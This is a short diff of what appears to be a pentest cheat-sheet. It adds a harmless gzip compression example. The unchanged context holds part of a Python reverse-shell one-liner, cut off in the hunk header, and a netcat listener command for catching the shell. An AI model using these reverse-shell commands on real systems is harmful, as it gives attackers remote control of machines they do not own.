@@ -56,3 +56,7 @@ python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 listener:
 nc -lvp 7003 
 
+compress file to stdout:
+cat file.txt | gzip -f > file.txt.gz
+
+
